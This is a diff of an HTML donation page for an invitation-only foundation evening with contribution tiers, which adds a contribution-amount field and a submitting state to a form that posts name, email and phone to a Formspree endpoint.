@@ -141,15 +141,10 @@ input {
   <p class="small">Attendance is reserved for confirmed contributors.</p>
 
   <p class="small"><span class="highlight">Supporting Contributor</span><br>USD 5,000</p>
-  <p class="small">Entry into the foundation’s work and evening access.</p>
-
   <p class="small"><span class="highlight">Principal Contributor</span><br>USD 15,000</p>
-  <p class="small">Aligned participation within the core guest circle.</p>
-
   <p class="small"><span class="highlight">Patron</span><br>USD 50,000</p>
-  <p class="small">Support Toward Flagship Initiatives.</p>
 
-  <input type="text" placeholder="Enter custom amount (USD)">
+  <input type="text" id="amount" placeholder="Enter custom amount (USD)">
 
   <a class="button" id="confirmBtn">Confirm Participation</a>
 </div>
@@ -177,7 +172,7 @@ input {
   <input type="text" id="phone" placeholder="Contact Number">
 
   <p class="small" style="margin-top:20px;">
-    You will be contacted via email with final entry instructions prior to the evening.
+    You will be contacted with final entry instructions prior to the evening.
   </p>
 
   <a class="button" id="submitBtn">Submit Details</a>
@@ -200,7 +195,12 @@ input {
 </div>
 
 <script>
+let selectedAmount = "";
+
+// capture amount early
 document.getElementById("confirmBtn").addEventListener("click", function(){
+  selectedAmount = document.getElementById("amount").value || "Not specified";
+
   document.getElementById("main").style.display = "none";
   document.getElementById("processing").style.display = "block";
 
@@ -210,25 +210,35 @@ document.getElementById("confirmBtn").addEventListener("click", function(){
   }, 2500);
 });
 
+// submit
 document.getElementById("submitBtn").addEventListener("click", function(){
   const name = document.getElementById("name").value;
   const email = document.getElementById("email").value;
   const phone = document.getElementById("phone").value;
 
-  fetch("https://formspree.io/f/maqakpey", {
-    method: "POST",
-    headers: {
-      "Content-Type": "application/json"
-    },
-    body: JSON.stringify({
-      name: name,
-      email: email,
-      phone: phone
-    })
-  }).then(() => {
-    document.getElementById("credentials").style.display = "none";
-    document.getElementById("final").style.display = "block";
-  });
+  // UX: show submitting state
+  const btn = document.getElementById("submitBtn");
+  btn.innerText = "Submitting...";
+  btn.style.opacity = "0.6";
+  btn.style.pointerEvents = "none";
+
+  setTimeout(() => {
+    fetch("https://formspree.io/f/maqakpey", {
+      method: "POST",
+      headers: {
+        "Content-Type": "application/json"
+      },
+      body: JSON.stringify({
+        name: name,
+        email: email,
+        phone: phone,
+        contribution: selectedAmount
+      })
+    }).then(() => {
+      document.getElementById("credentials").style.display = "none";
+      document.getElementById("final").style.display = "block";
+    });
+  }, 1000);
 });
 </script>
 
